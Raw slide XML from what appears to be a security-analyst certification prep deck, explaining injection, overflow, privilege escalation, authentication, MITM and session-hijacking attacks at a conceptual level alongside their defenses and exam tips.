              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Used in XML data transfer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Inject bad data into XML</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391</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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INJECTION AND OVERFLOW ATTACKS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Attack Types – Injection (5)</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Directory traversal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Enables an attacker to view, modify, or execute files in a system they normally would not be able to access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392</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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INJECTION AND OVERFLOW ATTACKS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Attack Types – Overflow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Overflow attacks happen when an attacker provides more input than the programmer allocated space for, causing the excess data to spill into adjacent memory the program did not intend to be written.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A buffer overflow overwrites neighboring memory (such as the stack), and by writing into unauthorized areas an attacker may corrupt control data like a return address to redirect execution to malicious code; a heap overflow is the same class of flaw against dynamically allocated heap memory.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An integer overflow occurs when a program is given integer values that are too large or too small for the variable to hold, wrapping around to an unexpected value that can then miscalculate a buffer size and trigger a memory-corruption condition.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst cares because overflow vulnerabilities can lead to crashes, denial of service, or full remote code execution, and defenses like input length validation, ASLR, and DEP directly reduce this risk.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Be ready to distinguish buffer, heap, and integer overflows and to recognize that overflow flaws stem from insufficient bounds checking and can enable code execution or denial of service.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393</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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INJECTION AND OVERFLOW ATTACKS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Attack Types – Overflow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Happens when attacker provides more input than the programmer allowed for</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Input may overflow into the next memory space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394</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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INJECTION AND OVERFLOW ATTACKS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Attack Types – Overflow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Buffer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Attacker may be able to write to unauthorized areas of memory</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Integer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Provide integer values that are too large or too small</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Heap</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Cause a program to call itself multiple times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395</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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INJECTION AND OVERFLOW ATTACKS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Attack Types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Many of the most damaging attacks (SQL injection, command injection, buffer overflows, and cross-site scripting) succeed because an application accepts data from a user and then treats that data as trusted, so the single most effective defense is rigorous input validation on every field the application receives.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The strongest validation strategy is allow-listing (also called positive validation): define exactly what valid input looks like in terms of type, length, format, and range, process only input that matches, and outright reject anything that does not rather than trying to sanitize or 'cleanse' malicious content.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Attempting to strip or escape bad characters is fragile because attackers constantly find new encodings and bypasses, whereas rejecting non-conforming input closes the gap entirely.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst cares because the majority of web and application compromises they investigate trace back to missing or weak input validation, and knowing this shapes both remediation recommendations and detection rules.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect scenario questions asking for the best mitigation against injection or XSS, where the correct answer is input validation using an allow-list rather than blocklist filtering or output-only sanitization.</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396</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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INJECTION AND OVERFLOW ATTACKS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Attack Types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Best way to stop them is to carefully and aggressively parse input</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Validate all input</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Only process valid input</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  If it’s not valid input, reject it</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Don’t try to cleanse it</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397</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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AUTHENTICATION ATTACKS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Privilege Escalation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Privilege escalation is when an attacker who already has some level of access attempts to gain rights beyond what they are authorized to hold, ideally reaching an administrator or root account that controls the whole system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Vertical escalation moves from a lower-privileged account to a higher one (a standard user becoming admin/root), while horizontal escalation moves sideways to another account at the same level to access its data; attackers achieve this by logging in as someone else, brute-forcing credentials, or exploiting vulnerabilities such as misconfigurations, kernel flaws, or SUID binaries to escape into a higher-privilege shell.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Escalation is a distinct phase in the attack lifecycle that follows initial access and enables lateral movement, persistence, and data exfiltration.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SOC analysts prioritize detecting and closing escalation paths because a low-severity foothold becomes a full breach the moment the attacker gains privileged control, and vulnerability scans often flag the exact CVEs and configuration weaknesses that make escalation possible.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam tests distinguishing vertical from horizontal privilege escalation and recognizing that a chained low-severity vulnerability enabling escalation should be prioritized higher than its base CVSS score suggests.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398</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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AUTHENTICATION ATTACKS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Privilege Escalation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Attacker tries to do more than they’re authorized to do</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Then attempts to gain higher privilege</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Ideally, attacker tries to become admin or root user</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399</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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AUTHENTICATION ATTACKS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Privilege Escalation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Ways to escalate privilege:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Login as someone else</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Brute force your way in</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Exploit various vulnerabilities to allow you to escape to a higher privilege shell</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400</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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AUTHENTICATION ATTACKS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Authentication Attacks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Authentication attacks target the login process to gain access without legitimate authorization, and the three you must know are password spraying, credential stuffing, and impersonation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Password spraying tries a small list of common passwords against many accounts to stay under lockout thresholds, while credential stuffing takes username/password pairs leaked from one breach and replays them across many other sites, exploiting the fact that people reuse credentials.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Impersonation is broader: the attacker presents themselves as a legitimate user or entity, often by stealing or replaying valid login credentials or session tokens.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because these attacks produce distinct telemetry (many accounts failing one password versus one account tried with many passwords versus successful logins from impossible-travel locations), and recognizing the pattern drives the right response such as enforcing MFA, monitoring for leaked-credential reuse, and tuning detection thresholds.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: You will be asked to identify password spraying versus credential stuffing versus brute force from authentication-log symptoms and to recommend MFA and credential-monitoring as countermeasures.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401</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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AUTHENTICATION ATTACKS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Authentication Attacks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Password spraying</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Use list of popular passwords across a bunch of machines</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Credential stuffing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Attacker obtains list of previously-leaked usernames and passwords and tries to use them on many other sites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402</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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AUTHENTICATION ATTACKS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Authentication Attacks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Impersonation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Attacker pretends to be someone else</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Stealing someone’s login credentials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403</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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EXPLOITS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Impersonation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Impersonation is an attack in which the adversary assumes the identity of a trusted user, service, device, or organization to gain access or trick a target into an action they would not otherwise take.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It is carried out by stealing and replaying valid credentials or session tokens, spoofing a source address or email domain, or using stolen certificates so that the attacker's traffic or requests appear to originate from a legitimate party.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because the attacker operates under valid-looking identity, their activity can bypass access controls and blend in with normal behavior, making it harder to detect than an obvious intrusion.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SOC analysts counter impersonation with strong authentication (MFA), mutual TLS and certificate validation, anomaly detection on user and entity behavior, and email authentication controls such as SPF, DKIM, and DMARC.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Impersonation appears as the correct term when a scenario describes an attacker acting under a legitimate identity, and as the threat that MFA, UEBA, and email authentication (SPF/DKIM/DMARC) are meant to mitigate.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404</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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EXPLOITS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Impersonation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g_5e0b4db8b3.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1931584" y="1783080"/>
            <a:ext cx="8325784" cy="4434840"/>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405</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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EXPLOITS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Man-in-the-Middle (MITM) Attack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A man-in-the-middle (also called on-path) attack occurs when an attacker secretly positions themselves between two communicating parties, relaying and potentially altering the traffic while each side believes it is talking directly to the other.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Common techniques that enable it include ARP poisoning on a local network, rogue or evil-twin Wi-Fi access points, DNS spoofing, and SSL stripping to downgrade an encrypted session to cleartext, all of which let the attacker intercept credentials, session tokens, and sensitive data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The attack breaks the confidentiality and integrity of the channel because the adversary can both read and modify messages in transit.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts defend against it with end-to-end encryption, certificate pinning and validation, HSTS to prevent downgrade, and network monitoring for signs of ARP or DNS manipulation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam expects you to recognize MITM/on-path from indicators like ARP poisoning, rogue access points, or SSL stripping, and to select encryption and certificate validation as the defenses.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406</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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EXPLOITS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Man-in-the-Middle (MITM) Attack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g_3d34b567d8.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1962637" y="1783080"/>
            <a:ext cx="8263677" cy="4434840"/>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407</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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EXPLOITS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Session Hijack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Session hijacking is an attack in which the adversary takes over an authenticated user's active session by obtaining that session's identifier, usually the session cookie or token, and then acting as the user without needing their password.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The token is captured by sniffing unencrypted traffic, stealing it through cross-site scripting, predicting a weak session ID, or fixing a known ID onto the victim (session fixation), after which the attacker replays it to inherit the victim's authenticated state.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It is dangerous precisely because it sidesteps the login and MFA that already happened, granting the attacker the user's privileges directly.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts mitigate it by transmitting cookies only over TLS with the Secure and HttpOnly flags, regenerating session IDs after login, binding sessions to context, and enforcing timeouts, and they watch for a single session appearing from two locations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Session hijacking questions test the role of the session token/cookie and the mitigations (HttpOnly/Secure cookies, session ID regeneration, TLS) that prevent token theft and replay.</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408</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
